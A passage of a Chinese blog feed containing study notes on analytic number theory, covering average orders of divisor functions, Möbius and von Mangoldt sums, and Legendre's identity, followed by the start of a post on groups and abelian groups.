&lt;h2 id=&#34;chapter2-除数函数sigma_alphan的平均阶&#34;&gt;Chapter2 除数函数$\sigma_\alpha(n)$的平均阶
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;我们在上面讨论了$\alpha=0$的情况，接下来我们讨论$\alpha=1$和$\alpha&amp;gt;1$的情况。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**Th1:**对所有的$x\ge 1$我们有&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
\sum_{n\le x}\sigma_1(n)=\dfrac{1}{2}\zeta(2)x^2+\Omicron(x\log x)
$$&lt;/p&gt;
&lt;p&gt;注：能够证明$\zeta(2)=\dfrac{\pi^2}{6}$，所以$\sigma_1(n)$的平均阶是$\dfrac{\pi^2n}{12}$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;与上一个chapter相似，我们写成下面的这种形式：
$$
\begin{align*}
\sum_{n\le x}\sigma_1(n)
&amp;amp;=\sum_{n\le x}\sum_{q|n}q=\sum_{q,d \newline qd\le x}q=\sum_{d\le x}\sum_{q\le\dfrac{x}{d}}q \newline
&amp;amp;=\sum_{d\le x}{\frac{1}{2}(\frac{x}{d})^2+\Omicron(\frac{x}{d})} \newline
&amp;amp;=\frac{x^2}{2}\sum_{d\le x}\frac{1}{d^2}+\Omicron(x\sum_{d\le x}\frac{1}{d})  \newline
&amp;amp;=\frac{x^2}{2}\sum_{d\le x}{-\frac{1}{x}+\zeta(2)+\Omicron(\frac{1}{x^2})}+\Omicron(x\log x) \newline
&amp;amp;=\dfrac{1}{2}\zeta(2)x^2+\Omicron(x\log x) \newline
\end{align*}
$$
配合欧拉求和完成求证。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;**Th2:**如果$x\ge1$且$\alpha&amp;gt;0,\alpha \ne 1$，我们有&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
\sum_{n\le x}\sigma_\alpha(n)=\dfrac{\zeta(\alpha+1)}{\alpha+1}x^{\alpha+1}+\Omicron(x^\beta)
$$&lt;/p&gt;
&lt;p&gt;其中，$\beta=max{1,\alpha}$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;配合欧拉求和公式的推论，我们开始证明：
$$
\begin{align*}
\sum_{n\le x}\sigma_\alpha(n)&amp;amp;=\sum_{n\le x}\sum_{q|n}q^\alpha=\sum_{d\le x}\sum_{q\le \frac{x}{d}}q^\alpha \newline
&amp;amp;=\sum_{d\le x}(\dfrac{1}{\alpha+1}(\dfrac{d}{x})^{\alpha+1}+\Omicron(\dfrac{x^\alpha}{d^\alpha})) \newline
&amp;amp;=\dfrac{x^{\alpha+1}}{\alpha+1}\sum_{d\le x}\dfrac{1}{d^{\alpha+1}}+\Omicron(x^\alpha\sum_{d\le x}\dfrac{1}{d^\alpha}) \newline
&amp;amp;=\dfrac{x^{\alpha+1}}{\alpha+1}{\dfrac{x^{-\alpha}}{-\alpha}+\zeta(\alpha+1)+\Omicron(x^{-\alpha-1})}+\Omicron(x^\alpha{\dfrac{x^{1-\alpha}}{1-\alpha}+\zeta(\alpha)+\Omicron(x^{-\alpha})}) \newline
&amp;amp;=\dfrac{\zeta(\alpha+1)}{\alpha+1}x^{\alpha+1}+\Omicron(x)+\Omicron(1)+\Omicron(x^\alpha) \newline
&amp;amp;=\dfrac{\zeta(\alpha+1)}{\alpha+1}x^{\alpha+1}+\Omicron(x^\beta)
\end{align*}
$$
其中，$\beta=max{1,\alpha}$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Th3:对于负数$\alpha$的$\sigma_\alpha(n)$的平均阶，我们让$\alpha=-\beta,\beta&amp;gt;0$。&lt;/p&gt;
&lt;p&gt;如果$\beta&amp;gt;0$，令$\delta=max{0,1-\beta}$，当$x&amp;gt;1$我们有&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
\sum_{n\le x}\sigma_{-\beta}(n)=
\begin{cases}
\zeta(\beta+1)x+\Omicron(x^\delta)&amp;amp;,\beta \ne 1 \newline
\zeta(2)x+\Omicron(\log x)&amp;amp;,\beta=1 \newline
\end{cases}
$$&lt;/p&gt;
&lt;p&gt;其中，$\beta=max{1,\alpha}$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;我们有
$$
\begin{align*}
\sum_{n\le x}\sigma_{-\beta}(n)
&amp;amp;=\sum_{n\le x}\sum_{d|n}\dfrac{1}{d^\beta}
=\sum_{d\le x}\dfrac{1}{d^\beta}\sum_{q\le \frac{x}{d}}1
\newline
&amp;amp;=\sum_{d\le x}\dfrac{1}{d^\beta}{\dfrac{x}{d}+\Omicron(1)} \newline
&amp;amp;=x\sum_{d\le x}\frac{1}{d^{\beta+1}}+\Omicron(\sum_{d\le x}\dfrac{1}{d^\beta})
\end{align*}
$$
最后一项当$\beta=1$时是$\Omicron(\log x)$，当$\beta \ne1$时是$\Omicron(x^\delta)$：
$$
x\sum_{d\le x}\dfrac{1}{d^{\beta+1}}=\dfrac{x^{1-\beta}}{-\beta}+\zeta(\beta+1)x+\Omicron(x^{-\beta})=\zeta(\beta+1)x+\Omicron(x^{1-\beta})
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter3-mun和lambdan的平均阶&#34;&gt;Chapter3 $\mu(n)$和$\Lambda(n)$的平均阶
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**Th1:**如果$h=f*g$，令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
H(x)=\sum_{n\le x}h(n),F(x)=\sum_{n\le x}f(n),G(x)=\sum_{n\le x}g(n)
$$&lt;/p&gt;
&lt;p&gt;则有
$$
H(x)=\sum_{n\le x}f(n)G(\dfrac{x}{n})=\sum_{n\le x}g(n)F(\dfrac{x}{n})
$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;令
$$
U=
\begin{cases}
0&amp;amp;,0 ,x&amp;lt;1 \newline
1&amp;amp;,x \ge 1
\end{cases}
$$
于是根据广义卷积得到：$F=f\circ U,G=g \circ U$&lt;/p&gt;
&lt;p&gt;使用结合律得到
$$
f \circ G = f \circ(g \circ U)=(f&lt;em&gt;g)\circ U=H \newline
g \circ F = g \circ(f \circ U)=(g&lt;/em&gt;f)\circ U=H
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;**Th2:**如果$F(x)=\sum\limits_{n\le x}f(n)$，则有&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
\sum_{n\le x}\sum_{d|n}f(d)=\sum_{n\le x}f(n)[\dfrac{x}{n}]=\sum_{n\le x}F(\dfrac{x}{n})
$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;我们把上面证明出来的定理中，对所有的n，$g(n)=1$，那么$G(x)=[x]$&lt;/p&gt;
&lt;p&gt;于是这个定理对应上一个定理的结论。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;**Th3:**对所有的$x\ge1$，我们有&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
\sum_{n\le x}\mu(n)[\dfrac{x}{n}]=1 \newline
\sum_{n\le x}\Lambda(n)[\dfrac{x}{n}]=\log {[x]!}
$$&lt;/p&gt;
&lt;p&gt;​	当且仅当$x&amp;lt;2$时，等号成立。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;根据定理2：
$$
\sum_{n\le x}\mu(n)[\dfrac{x}{n}]=\sum_{n\le x}\sum_{d|n}\mu(d)=\sum_{n\le x}[\dfrac{1}{n}]=1
\newline
\sum_{n\le x}\Lambda(n)[\dfrac{x}{n}]=\sum_{n\le x}\sum_{d|n}\Lambda(d)=\sum_{n\le x}\log n=\log{[x]!}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;**Th4:**对所有的$x\ge1$，我们有&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
|\sum_{n\le x}\dfrac{\mu(n)}{n}|\le1
$$&lt;/p&gt;
&lt;p&gt;​	当且仅当$x&amp;lt;2$时，等号成立。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;如果$x&amp;lt;2$,那么这个求和里面只有一个$\mu(1)=1$&lt;/p&gt;
&lt;p&gt;假设$x\ge2$，对每个实数y，我们有${y}=y-[y]$，于是有
$$
\begin{align*}
1 &amp;amp;= \sum_{n\le x}\mu(n)[\dfrac{x}{n}]=\sum_{n\le x}\mu(n)(\dfrac{x}{n}-{\dfrac{x}{n}})
\newline
&amp;amp;=x\sum_{n\le x}\dfrac{\mu(n)}{n}-\sum_{n\le x}\mu(n){\dfrac{x}{n}} \newline
\end{align*}
$$
因为$0\le {y} &amp;lt; 1$，所以
$$
x|\sum_{n\le x}\dfrac{\mu(n)}{n}|=|1+\sum_{n\le x}\mu(n){\dfrac{x}{n}}|
\newline  \le 1+\sum_{n\le x}{\dfrac{x}{n}} =1+{x}+\sum_{2\le n \le x}{\dfrac{x}{n}}
\newline &amp;lt; 1+{x}+[x]-1=x
$$
两边除x得到不等号&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Th5:&lt;/strong&gt;（勒让德等式 Legendre&amp;rsquo;s identity）&lt;/p&gt;
&lt;p&gt;对每一个$x\ge1$，我们有&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
[x]! = \prod_{p\le x}p^{\alpha(p)}
$$&lt;/p&gt;
&lt;p&gt;​		其中，
$$
\alpha(p)=\sum_{m=1}^\infty[\dfrac{x}{p^m}]
$$
​		注：$\alpha(p)$的和式是有限的，因为对于$p&amp;gt;x,\dfrac{[x]}{p^m}=0$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;如果n不是素数幂，那么有$\Lambda(n)=0$。&lt;/p&gt;
&lt;p&gt;对于素数幂的n，有$\Lambda(p^m)=\log p$。&lt;/p&gt;
&lt;p&gt;所以
$$
\log{[x]!}=\sum_{n\le x}\Lambda(n)[\dfrac{x}{n}]=\sum_{p\le x}\sum_{m=1}^{\infty}[\dfrac{x}{p^m}]\log p=\sum_{p\le x}\alpha(p)\log p
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下面利用欧拉求和公式去确定$\log[x]!$的渐进公式。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**Th6:**如果$x\ge2$，我们有&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
\log[x]! = x\log x - x + \Omicron(\log x)
$$&lt;/p&gt;
&lt;p&gt;同时就有
$$
\sum_{n\le x}\Lambda(n)[\dfrac{x}{n}]= x\log x - x + \Omicron(\log x)
$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;在欧拉求和公式里取$f(t)=\log t$可以得到：
$$
\begin{align*}
\sum_{n\le x}\log n&amp;amp;=\int_{1}^x\log t{\rm d}x+\int_{1}^x\dfrac{t-[t]}{t}dt-(x-[x])\log x \newline
&amp;amp;=x\log x - x+1+\int_{1}^x\dfrac{t-[t]}{t}dt+\Omicron(\log x)
\end{align*}
$$
而$\int_{1}^x\dfrac{t-[t]}{t}dt =\Omicron(\int_1^x\dfrac{1}{t}dt) =  \Omicron(\log x)$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接下来是上一个定理的推论:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**Th7:**如果$x\ge2$，我们有&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
\sum_{p\le x}[\dfrac{x}{p}]\log p=x\log x+\Omicron(x)
$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;如果n不是素数幂，那么有$\Lambda(n)=0$。
$$
\begin{align*}
\sum_{n\le x}[\dfrac{x}{n}]\Lambda(n)&amp;amp;=\sum_{p}\sum_{m=1}^\infty[\dfrac{x}{p^m}]\Lambda(p^m) \newline
&amp;amp;=\sum_{p}\sum_{m=1}^\infty[\dfrac{x}{p^m}]\log p \newline
&amp;amp;=\sum_{p\le x}[\dfrac{x}{p}]\log p + \sum_{p\le x}\sum_{m=2}^\infty[\dfrac{x}{p^m}]\log p
\end{align*}
$$
接下来证明等式最后一项为$\Omicron(x)$
$$
\begin{align*}
\sum_{p\le x}\sum_{m=2}^\infty[\dfrac{x}{p^m}]\log p
&amp;amp;=\sum_{p\le x}\log p\sum_{m=2}^\infty[\dfrac{x}{p^m}] \newline
&amp;amp;\le\sum_{p\le x}\log p\sum_{m=2}^\infty\dfrac{x}{p^m} \newline
&amp;amp;=x\sum_{p\le x}\log p\sum_{m=2}^\infty\dfrac({1}{p})^m \newline
&amp;amp;=x\sum_{p\le x}\dfrac{\log p}{p(p-1)} \newline
&amp;amp;\le x\sum_{n=2}^\infty\dfrac{\log n}{n(n-1)} \newline
&amp;amp;=\Omicron(x)
\end{align*}
$$
于是证明了
$$
\sum_{n\le x}[\dfrac{x}{n}]\Lambda(n)
=\sum_{p\le x}[\dfrac{x}{p}]\log p + \Omicron(x)
$$
结合上一个定理
$$
\sum_{n\le x}\Lambda(n)[\dfrac{x}{n}]= x\log x - x + \Omicron(\log x)
$$
可以得到
$$
\sum_{p\le x}[\dfrac{x}{p}]\log p + \Omicron(x) = x\log x - x + \Omicron(\log x) \newline
\sum_{p\le x}[\dfrac{x}{p}]\log p=x\log x+\Omicron(x)
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>解析数论之有限阿贝尔群及其特征、狄利克雷特征</title>
        <link>https://dorinxl.github.io/p/%E8%A7%A3%E6%9E%90%E6%95%B0%E8%AE%BA%E4%B9%8B%E6%9C%89%E9%99%90%E9%98%BF%E8%B4%9D%E5%B0%94%E7%BE%A4%E5%8F%8A%E5%85%B6%E7%89%B9%E5%BE%81%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E7%89%B9%E5%BE%81/</link>
        <pubDate>Fri, 04 Aug 2023 11:07:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E8%A7%A3%E6%9E%90%E6%95%B0%E8%AE%BA%E4%B9%8B%E6%9C%89%E9%99%90%E9%98%BF%E8%B4%9D%E5%B0%94%E7%BE%A4%E5%8F%8A%E5%85%B6%E7%89%B9%E5%BE%81%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E7%89%B9%E5%BE%81/</guid>
        <description>


&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34; fill=&#34;hsl(30, 80%, 70%)&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;本文使用&lt;strong&gt;Typora&lt;/strong&gt;编写，但Hugo使用&lt;strong&gt;KaTex&lt;/strong&gt;渲染，可能会出现不兼容状态，如需最佳体验请前往&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/DorinXL/p/17606790.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这里&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;

&lt;h2 id=&#34;目录&#34;&gt;目录
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Chapter1 群的定义、性质&lt;/li&gt;
&lt;li&gt;Chapter2 构造子群&lt;/li&gt;
&lt;li&gt;Chapter3 有限阿贝尔群的特征&lt;/li&gt;
&lt;li&gt;Chapter4 狄利克雷特征&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter1-群的定义性质&#34;&gt;Chapter1 群的定义、性质
&lt;/h2&gt;&lt;h3 id=&#34;section1-群&#34;&gt;Section1 群
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;群&lt;/strong&gt;：一个群是由元素和二元运算组成的非空集合。我们用$\cdot$表示这种二元运算，群是满足下列条件的代数结构(algebraic structure)
&lt;ul&gt;
&lt;li&gt;封闭性：$\forall a,b \in G,a \cdot b \in G;(Z,\div)$不是封闭性&lt;/li&gt;
&lt;li&gt;结合性：$\forall a,b,c \in G,a \cdot(b\cdot c) = (a \cdot b)\cdot c$&lt;/li&gt;
&lt;li&gt;单位元：$\exist e \in G,\forall a \in G,a \cdot e = e \cdot a = a$&lt;/li&gt;
&lt;li&gt;逆元：$\forall a \in G,\exist b \in G,a \cdot b = b\cdot a = e. a的逆元记为a^{-1}$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;$(Z,+)$（满足群的定义）
&lt;ul&gt;
&lt;li&gt;封闭性：整数相加还是整数&lt;/li&gt;
&lt;li&gt;结合律：整数相加满足加法结合律&lt;/li&gt;
&lt;li&gt;单位元：0&lt;/li&gt;
&lt;li&gt;逆元：整数的相反数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;$(Q,\times)$（不满足群的定义）
&lt;ul&gt;
&lt;li&gt;封闭性：有理数相乘还是有理数&lt;/li&gt;
&lt;li&gt;结合律：有理数相乘满足乘法结合律&lt;/li&gt;
&lt;li&gt;单位元：1&lt;/li&gt;
&lt;li&gt;逆元：有理数的倒数（0除外）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;$(Q/{0},\times)$排除0的集合满足群的定义。&lt;/li&gt;
&lt;li&gt;$(Z_p^{*},\times)$
&lt;ul&gt;
&lt;li&gt;封闭性：相乘再模p，还是集合里的元素&lt;/li&gt;
&lt;li&gt;结合律：模运算满足乘法结合律&lt;/li&gt;
&lt;li&gt;单位元：1&lt;/li&gt;
&lt;li&gt;逆元：乘法逆元&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**Th1:**群里的单位元是唯一的。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:反证法：&lt;/p&gt;
&lt;p&gt;假设存在两个单位元$e$,$e&amp;rsquo;\in G，e\ne e&#39;$&lt;/p&gt;
&lt;p&gt;根据单位元的运算：$e*e&amp;rsquo; = e&amp;rsquo; = e$，出现矛盾&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;**Th2:**每个群里只有唯一的逆元。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:反证法：&lt;/p&gt;
&lt;p&gt;假设$a \in G$存在两个不相等的逆元$b,c$&lt;/p&gt;
&lt;p&gt;$b=b&lt;em&gt;e$，而$a&lt;/em&gt;c=e$，所以有$b=b&lt;em&gt;e=b&lt;/em&gt;(a&lt;em&gt;c)=(b&lt;/em&gt;a)&lt;em&gt;c=e&lt;/em&gt;c=c$&lt;/p&gt;
&lt;p&gt;所以$b=c$，矛盾。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Th4:&lt;/strong&gt;（消去律）$a&lt;em&gt;b=a&lt;/em&gt;c \Rightarrow b=c$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof:&lt;/strong&gt;
$$
\begin{align*}
a&lt;em&gt;b&amp;amp;=a&lt;/em&gt;c \newline
a^{-1}&lt;em&gt;a&lt;/em&gt;b&amp;amp;=a^{-1}&lt;em&gt;a&lt;/em&gt;c \newline
e&lt;em&gt;b&amp;amp;=e&lt;/em&gt;c \newline
b&amp;amp;=c \newline
\end{align*}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;**Th5:**方程$a*x=b$有唯一解$x \in G$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;需要注意的是，这是个群的方程，运算符号不代表乘号。
$$
\begin{align*}
a*x&amp;amp;=b \newline
a^{-1}&lt;em&gt;a&lt;/em&gt;x&amp;amp;=a^{-1}&lt;em&gt;b \newline
e&lt;/em&gt;x&amp;amp;=a^{-1}*b \newline
x&amp;amp;=a^{-1}&lt;em&gt;b
\end{align&lt;/em&gt;}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Th6:&lt;/strong&gt;$(a*b)^{-1}=b^{-1} * a^{-1}$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;思路是证明一个元素是另一个元素的逆元：
$$
\begin{align*}
&amp;amp;(a&lt;em&gt;b)&lt;/em&gt;(b^{-1}&lt;em&gt;a^{-1}) \newline
&amp;amp;=a&lt;/em&gt;(b&lt;em&gt;b^{-1})&lt;em&gt;a^{-1} \newline
&amp;amp;=a&lt;/em&gt;e&lt;/em&gt;a^{-1} \newline
&amp;amp;=a&lt;em&gt;a^{-1} \newline
&amp;amp;=e
\end{align&lt;/em&gt;}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Th7:&lt;/strong&gt;$(a^{-1})^{-1}=a$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;因为$a^{-1}*a=e$,所以$a^{-1}$的逆元就是$a$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;群里只有一个元素时，称为平凡群，这唯一的元素就是单位元。如$({1},\times)$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;section2-阿贝尔群abelian-group&#34;&gt;Section2 阿贝尔群（Abelian Group）
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;阿贝尔群又叫交换群（commutative group），如果对于群G中的任意元素$a,b \in G$，都有$a&lt;em&gt;b=b&lt;/em&gt;a$，那么G称为阿贝尔群。由此，阿贝尔群就是在群的性质上添加了交换律。所以一个阿贝尔群满足以下性质：
&lt;ul&gt;
&lt;li&gt;封闭性、结合律、单位元、逆元、交换律。&lt;/li&gt;
&lt;li&gt;之前提到的$(Z,+),(Z_P^*,\times),(Q/{0},\times)$都满足交换律，所以都是阿贝尔群。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**Th1:**群G是阿贝尔群，当且仅当，$\forall a,b \in G$，有$(a*b)^2 = a^2 * b^2$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;必要性$\Rightarrow$：群G是阿贝尔群，有$a&lt;em&gt;b=b&lt;/em&gt;a$&lt;/p&gt;
&lt;p&gt;于是$a&lt;em&gt;a&lt;/em&gt;b&lt;em&gt;b=a&lt;/em&gt;b&lt;em&gt;a&lt;/em&gt;b$&lt;/p&gt;
&lt;p&gt;所以$a^2&lt;em&gt;b^2=(a&lt;/em&gt;b)^2$&lt;/p&gt;
&lt;p&gt;充分性$\Leftarrow$：&lt;/p&gt;
&lt;p&gt;群G满足$a^2&lt;em&gt;b^2=(a&lt;/em&gt;b)^2$&lt;/p&gt;
&lt;p&gt;于是展开得到$a&lt;em&gt;a&lt;/em&gt;b&lt;em&gt;b=a&lt;/em&gt;b&lt;em&gt;a&lt;/em&gt;b$&lt;/p&gt;
&lt;p&gt;分别消去前后的$a,b$得到$a&lt;em&gt;b=b&lt;/em&gt;a$正好是交换律的式子&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;**Th2：**语法糖&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;$$a^t=a&lt;em&gt;a&lt;/em&gt;a*\cdots*a$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$a^{-t}=a^{-1}&lt;em&gt;a^{-1}&lt;em&gt;a^{-1}&lt;/em&gt;\cdots&lt;/em&gt;a^{-1}$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$(a^t)^m=a^{tm}$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;$$
\begin{align*}
&amp;amp;(a^t)^m \newline
&amp;amp;=(a&lt;em&gt;a&lt;/em&gt;\cdots&lt;em&gt;a)&lt;/em&gt;\cdots*(a&lt;em&gt;a&lt;/em&gt;\cdots&lt;em&gt;a) \newline
&amp;amp;=a&lt;/em&gt;a*\cdots&lt;em&gt;a&lt;/em&gt;\cdots&lt;em&gt;a&lt;/em&gt;a*\cdots&lt;em&gt;a \newline
&amp;amp;=a^{tm}
\end{align&lt;/em&gt;}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$a^t * a^m= a^{t+m}$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$(a^{-1})^t=(a^t)^{-1}$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;$$
\begin{align*}
&amp;amp;(a^{-1})^t*(a^t)^{-1} \newline
&amp;amp;=a^{-1}&lt;em&gt;a^{-1}&lt;/em&gt;\cdots&lt;em&gt;a^{-1}&lt;em&gt;a&lt;/em&gt;a&lt;/em&gt;\cdots&lt;em&gt;a \newline
&amp;amp;=a^{-1}&lt;em&gt;a^{-1}&lt;/em&gt;\cdots&lt;/em&gt;e&lt;em&gt;a&lt;/em&gt;\cdots&lt;em&gt;a \newline
&amp;amp;=e
\end{align&lt;/em&gt;}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;**Th3:**G是阿贝尔群，$\forall a,b \in G,$有$(a&lt;em&gt;b)^t=a^t&lt;/em&gt;b^t$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;$$
\begin{align*}
(a&lt;em&gt;b)^t&amp;amp;=(a&lt;/em&gt;b)&lt;em&gt;(a&lt;/em&gt;b)&lt;em&gt;\cdots&lt;/em&gt;(a&lt;em&gt;b) \newline
&amp;amp;=a&lt;/em&gt;b&lt;em&gt;a&lt;/em&gt;b*\cdots&lt;em&gt;a&lt;/em&gt;b \newline
&amp;amp;=(a&lt;em&gt;a&lt;/em&gt;\cdots&lt;em&gt;a)&lt;/em&gt;(b&lt;em&gt;b&lt;/em&gt;\cdots&lt;em&gt;b) \newline
&amp;amp;=a^t&lt;/em&gt;b^t
\end{align*}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;将t=2，就和Th1相等了。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;section3-子群subgroup&#34;&gt;Section3 子群（subgroup）
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：&lt;/p&gt;
